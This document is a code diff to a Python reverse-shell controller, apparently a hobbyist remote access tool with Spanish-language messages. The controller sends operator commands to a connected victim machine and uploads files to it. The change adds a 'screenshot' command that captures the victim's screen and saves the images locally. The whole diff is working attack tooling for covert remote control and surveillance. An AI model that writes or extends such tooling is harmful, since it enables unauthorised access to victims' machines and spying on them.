@@ -4,8 +4,10 @@
 import socket
 import base64
 
+
 def shell():
     current_dir = target.recv(1024)
+    count = 0
     while True:
         comando = raw_input("{}~#: ".format(current_dir))
         if comando == "exit":
@@ -30,7 +32,19 @@ def shell():
                 with open(comando[7:], 'rb') as file_upload:
                     target.send(base64.b64encode(file_upload.read()))
             except:
-                print("Ocurrio un error en la subida")   
+                print("Ocurrio un error en la subida") 
+
+        elif comando[:10] == "screenshot":
+            target.send(comando)
+            with open("monitor-%d.png" % count , 'wb' ) as screen:
+                datos = target.recv(1000000)
+                data_decode = base64.b64decode(datos)
+                if data_decode == "fail":
+                    print("No se pudo tomar la captura de pantalla :(")
+                else:
+                    screen.write(data_decode)
+                    print("Captura tomada con exito")
+                    count = count + 1      
         else:
             target.send(comando)
             res = target.recv(30000)
